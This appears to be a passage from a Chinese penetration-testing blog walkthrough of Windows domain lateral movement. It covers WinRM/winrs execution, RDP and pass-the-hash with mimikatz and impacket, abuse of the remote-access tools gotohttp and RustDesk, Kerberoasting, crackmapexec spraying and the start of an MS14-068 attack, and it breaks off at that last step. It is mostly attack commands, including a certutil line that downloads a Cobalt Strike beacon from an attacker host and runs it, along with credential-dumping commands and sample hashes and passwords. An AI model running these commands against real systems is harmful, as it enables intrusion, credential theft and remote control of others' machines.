<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:\beacon.exe &amp; c:\beacon.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b37dcec.png" alt="image-20240925233901855"></p>
<p>把生成的正向木马放到webserver的目录里</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b496aa5.png" alt="image-20240925234046683"></p>
<p>执行命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b3bcad5.png" alt="image-20240925234218444"></p>
<p>sqlserver已下载beacon.exe并成功执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933bdc4b22.png" alt="image-20240925234310415"></p>
<p>上线了就简单了</p>
<p>因为是正向连接  所以我们要绑定一下端口</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b321aa2.png" alt="image-20240925234430309"></p>
<p>然后就会上线了</p>
<p>cs本身可以直接WinRM</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b417e0d.png" alt="image-20240925234650300"></p>
<h3 id="Winrm"><a href="#Winrm" class="headerlink" title="Winrm"></a>Winrm</h3><p>生成一个计算器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell winrm invoke Create wmicimv2/win32_process @&#123;CommandLine=&quot;calc.exe&quot;&#125; -r:192.168.30.10 -u:Administrator -p:uu2fu3o@admin</span><br></pre></td></tr></table></figure>



<p>当然也可以生成服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#生成名为test的服务</span><br><span class="line">winrm invoke Create wmicimv2/Win32_Service @&#123;Name=&quot;test&quot;;DisplayName=&quot;test&quot;;PathName=&quot;cmd.exe /k c:\windows\system32\calc.exe&quot;&#125; -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin</span><br></pre></td></tr></table></figure>



<p>远程调用该服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke StartService wmicimv2/Win32_Service?Name=test -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin</span><br></pre></td></tr></table></figure>



<p>执行SMB匿名服务器中的后门文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell winrm invoke Create wmicimv2/Win32_Service @&#123;Name=&quot;test2&quot;;DisplayName=&quot;test2&quot;;PathName=&quot;cmd.exe /k \\192.168.30.20\smb\Winrm.exe&quot;&#125; -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin</span><br></pre></td></tr></table></figure>





<h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p>rdp就是远程桌面协议  默认监听端口为3389，通过已获得的凭据进行代理登录远程主机并进行实时操控</p>
<p>但是可能导致对方用户强行下线，易被发现</p>
<p>还是先看看开没开3389</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b31f48c.png" alt="image-20240926000935064"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b2f143a.png" alt="image-20240926001000955"></p>
<p><strong>RDP连接不仅支持明文，也支持hash连接</strong></p>
<p>CS的桌面交换其实就是基于RDP的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933bcd0d1d.png" alt="image-20240926001313288"></p>
<p>window本身的mstsc也是一样的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b2d6fdf.png" alt="image-20240926001424727"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933b30095e.png" alt="image-20240926001440656"></p>
<p>这些都是明文连接</p>
<p>hash连接</p>
<p>要mimikatz抓下密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz privilege::debug   #要管理员权限</span><br><span class="line"></span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>



<h2 id="C2横向"><a href="#C2横向" class="headerlink" title="C2横向"></a>C2横向</h2><p>C2, Command and Control, 命令与控制。主要是指攻击者通过与恶意软件的交互，对被害者进行控制，从而实施恶意活动的含义</p>
<p>下面这两个都是远程协助软件</p>
<h3 id="gotohttp"><a href="#gotohttp" class="headerlink" title="gotohttp"></a>gotohttp</h3><p><strong>gotohttp走的是https协议</strong></p>
<p>目标网络情况：</p>
<p>1、能出网，没有限制    #能直接用</p>
<p>2、能出网、有限制（xx端口，不限制https就行）</p>
<p>3、不出网、有限制（不限制https就行）</p>
<p>优点：B2C模式–&gt;<strong>不需要安装软件 有浏览器就行</strong></p>
<p>走的是https协议，只要放行443端口就可以实现内网穿透</p>
<p>缺点：</p>
<p>必须要有网络，不限制https</p>
<p>网络唤醒远程主机的时候，安全卫士可能拦截</p>
<p>我们需要把文件放到目标主机上</p>
<p>方法很多 就不多说了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e1ca7d7.png" alt="image-20240926004902922"></p>
<p>可以看到很小</p>
<p>运行程序</p>
<p>会生成控制码于ID</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e24058d.png" alt="image-20240926005026067"></p>
<p>这个软件在开完后会在当前路径中生成一个配置文件路径</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e1a73c6.png" alt="image-20240926005205338"></p>
<p>里面有我们需要的信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e269919.png" alt="image-20240926005238378"></p>
<p>直接通过它给的这个host连接</p>
<p>浏览器访问</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e6ec7a0.png" alt="image-20240926010553357"></p>
<p>连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e25a1e4.png" alt="image-20240926010910286"></p>
<p>连上了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e26aa30.png" alt="image-20240926011402624"></p>
<h3 id="RustDesk"><a href="#RustDesk" class="headerlink" title="RustDesk"></a>RustDesk</h3><p><a target="_blank" rel="noopener" href="https://github.com/rustdesk/rustdesk">RustDesk</a></p>
<p>优点：无网络（不出网）情况下也可以用</p>
<p>把rustdesk传入目标电脑</p>
<p>因为这是一个远程协助的工具 所以会被杀软列入白名单 </p>
<p>同样 他也会有配置文件</p>
<p>本地存放路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Roaming\RustDesk\config\RustDesk.toml</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e36024e.png" alt="image-20240927202509291"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e856099.png" alt="image-20240927202542779"></p>
<p>配置文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e41885a.png" alt="image-20240927202612230"></p>
<p>enc_id就是id</p>
<p>salt就是密码</p>
<p>如果是出网的情况下</p>
<p>我们就直接在本地开一个客户端进行远连就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e7cfa77.png" alt="image-20240927202740939"></p>
<p>如果是不出网的话</p>
<p>我们只需要找一个能与他进行通信的主机就可以了</p>
<p>我们选哟更改一下配置文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e532720.png" alt="image-20240927203058574"></p>
<p>添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">direct-server = &#x27;Y&#x27;</span><br><span class="line"></span><br><span class="line">direct-access-port = &#x27;8443&#x27;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e5addf3.png" alt="image-20240927203216208"></p>
<p>我们直接用同网段的主机连ip就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e3199ca.png" alt="image-20240927203447919"></p>
<p>注意配置文件里的local-ip-addr要是真ip–&gt;192.168.3.32</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e4c334e.png" alt="image-20240927203712819"></p>
<h2 id="kerberos协议"><a href="#kerberos协议" class="headerlink" title="kerberos协议"></a>kerberos协议</h2><h4 id="简单学习"><a href="#简单学习" class="headerlink" title="简单学习"></a>简单学习</h4><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903955416219661">kerberos学习</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_16242301/7297870">windows认证学习</a></p>
<p>简单理解</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e3d5f88.png" alt="image-20240927205855549"></p>
<p>当你在进行Hadoop安全访问时 就会用到kerberos协议</p>
<p>认证服务器在验证Client身份后会发一张票证(TGT)</p>
<p>Client将TGT交给票据授权服务器 通过后会通过TGT获取访问Server端的票据(ST)</p>
<p>这样就可以正常访问了</p>
<h4 id="kerberoasting攻击"><a href="#kerberoasting攻击" class="headerlink" title="kerberoasting攻击"></a>kerberoasting攻击</h4><p>SPN扫描</p>
<p>SPN：服务主体名称 他是域内服务的唯一标识 每一个服务，都会有一个SPN ，服务在加入域的时候，也会自动注册一个SPN</p>
<p>mysql、http、rdp都会有对应的SPN</p>
<p>使用场景：我们在没有办法获取到域内其他主机的凭据信息(mimikatz抓不到)时，就可以采用kerberoasting</p>
<p>也就是 请求对应的服务，获取服务的凭据(抓SPN凭据)，再将服务凭据导入本地进行破解</p>
<p>凭据加密类型rc4</p>
<p>SPN扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -T god.org -q */*   #扫全部</span><br><span class="line"></span><br><span class="line">setspn -T god.org -q */* | findstr &quot;MSSQL&quot;  #扫MSSQL</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933f19e35e.png" alt="image-20240927212603953"></p>
<p>工具检测：</p>
<p>Rubeus</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus kerberoast</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e25ae7c.png" alt="image-20240927214421084"></p>
<p>把这个文件放到目标主机上</p>
<p>然后执行命令就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933f5a75bc.png" alt="image-20240927214925634"></p>
<p>这样我们就直接找到了凭据加密类型是rc4的SPN</p>
<p>先请求到票据</p>
<p>查看票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933f250b64.png" alt="image-20240927215318596"></p>
<p>但是现在这些票据都不是我们需要的</p>
<p>清除票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e26fcec.png" alt="image-20240927215455023"></p>
<p>mimikatz请求SPN</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e47bfa8.png" alt="image-20240927215632909"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ask /target:MSSQLSvc/Srv-DB-0day.0day.org:1433</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933f0ad154.png" alt="image-20240927215727486"></p>
<p>好</p>
<p>退出</p>
<p>我们再看看票据</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933f0cc01b.png" alt="image-20240927215825606"></p>
<p>已经有新票证生成</p>
<p>第一个票证是AES加密的 我们用不了</p>
<p>第二个就是RC4加密的 可用</p>
<p>mimikatz导出票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933f210e93.png" alt="image-20240927220015285"></p>
<p>它会把票证导到mimikatz的路径下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e97d873.png" alt="image-20240927220058200"></p>
<p>把我们需要的票证放到kerberaost的文件夹里</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e8dd247.png" alt="image-20240927220233464"></p>
<p>直接用它内置的脚本+凭证名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933f32f553.png" alt="image-20240927220442507"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python tgsrepcrack.py 字典名 &quot;凭证名&quot;</span><br></pre></td></tr></table></figure>

<p>pass.txt是一个字典</p>
<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>要学习PTH需要知道一些windows认证的相关只是</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/404p3rs0n/p/15609556.html#00x01windows%E4%B9%8Bntlm%E8%AE%A4%E8%AF%81">window认证1</a></p>
<p><a target="_blank" rel="noopener" href="https://www.adminxe.com/733.html">windows认证2</a></p>
<p>windows本地有个存密码的地方–&gt;sum</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e97f5f2.png" alt="image-20240927231011394"></p>
<p>这个里面存放着密码的hash</p>
<p>在windows里面 密码的hash称之为NTML hash</p>
<p>在NTML协议存在之前 他的前身叫LM协议</p>
<p>两个的差别在于加密方式不同</p>
<p>LM协议更容易被破解</p>
<p>NTML协议是一种网络认证协议 它是基于挑战&#x2F;相应认证机制的一种认证模式  它只支持Windows</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933f5e2a2f.png" alt="image-20240927231948264"></p>
<h3 id="PTH-1"><a href="#PTH-1" class="headerlink" title="PTH"></a>PTH</h3><p>PTH:pass the hash(哈希传递)通过密码散列值（通常是NTLM Hash）来进行攻击</p>
<p>PTH是能够在不需要账户明文密码的情况下完成认证的一种技术</p>
<p>它解决了我们渗透中获取不到明文密码、破解不了NTML hash而又想扩大战果的问题</p>
<p>在域环境中，用户登录计算机时使用的账号，计算机会用相同的本地管理员账号和密码 两个账号密码类似因此，<strong>如果计算机的本地管理员账密是相同的，我们就可以使用哈希传递的方法登录到内网的其他主机</strong></p>
<blockquote>
<p>windows server 2012 R2   之前   LM或NTLM</p>
<p>windows server 2012 R2   之后	NTLM</p>
</blockquote>
<h3 id="mimikatz进行PTH攻击"><a href="#mimikatz进行PTH攻击" class="headerlink" title="mimikatz进行PTH攻击"></a>mimikatz进行PTH攻击</h3><p>需要交互式shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br><span class="line"></span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933f3753ab.png" alt="image-20240927235133453"></p>
<p>通信是在本地</p>
<p>但是我们有凭证 可以直接查看目标根目录</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933f04995c.png" alt="image-20240927235322177"></p>
<p>复制文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e283f77.png" alt="image-20240927235550964"></p>
<h3 id="impacket进行PTH攻击"><a href="#impacket进行PTH攻击" class="headerlink" title="impacket进行PTH攻击"></a>impacket进行PTH攻击</h3><p>套件可以在CS上执行</p>
<p>所以</p>
<ul>
<li>exe上传</li>
<li>socks代理无文件落地</li>
</ul>
<p>先建立socks代理</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933ec30a90.png" alt="image-20240928002058523"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e2cc199.png" alt="image-20240928002915710"></p>
<p>代理配置</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e97ee42.png" alt="image-20240928003005015"></p>
<h4 id="psexec-1"><a href="#psexec-1" class="headerlink" title="psexec"></a>psexec</h4><p>使用套件的psexec.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure>

<p>已进入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933f628a50.png" alt="image-20240928003254127"></p>
<p>其他服务同理</p>
<h4 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933e9800a3.png" alt="image-20240928003736029"></p>
<h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/670933f67e5b6.png" alt="image-20240928003858696"></p>
<h3 id="crackMapExec-PTH"><a href="#crackMapExec-PTH" class="headerlink" title="crackMapExec-PTH"></a>crackMapExec-PTH</h3><p>这是那个密码喷洒的工具</p>
<p>它同样可以进行pth攻击</p>
<p>密码喷洒，域用户登录pth</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains crackmapexec cme smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c #域用户HASH登录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxychains crackmapexec cme smb 192.168.3.21-32 -u administrator -H 518b98ad4178a53695dc997aa02d455c --local-auth #本地用户HASH登录</span><br></pre></td></tr></table></figure>





<h2 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h2><p>PTK: pass the key  <strong>当系统安装了KB2871997补丁并且禁用NTLM的时候</strong>，虽然此时我们抓取到的ntlm hash  就失效了，但是可以通过PTK进行攻击</p>
<p>未找到相应环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys #获取key</span><br><span class="line"></span><br><span class="line">mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值</span><br></pre></td></tr></table></figure>



<h2 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h2><p>PASS THE TICKET</p>
<p>有三种攻击方式</p>
<ul>
<li>漏洞-MS14068</li>
<li>KEKEO</li>
<li>mimikatz</li>
</ul>
<h3 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h3><p><strong>自己做一张票据</strong></p>
<p>只需要普通用户权限就可以实施攻击</p>
<p>KDC服务(密钥分发中心)的漏洞</p>
<p>原理：它允许身份验证的用户在kerberos票证里面插入任意的PAC，用户可以通过呈现具有改变的PAC的kerberos TGT来获得票证</p>
<p>首先 我们需要admin的sid值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami/user</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/10/11/67093410b4dde.png" alt="image-20241002195826304"></p>
<p>这里的sid是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S-1-5-21-1218902331-2157346161-1782232778-1132</span><br></pre></td></tr></table></figure>

<p>我们可以基于这个sid值在本地生成一个票据文件</p>
<p>github上找一个ms14-068的poc</p>
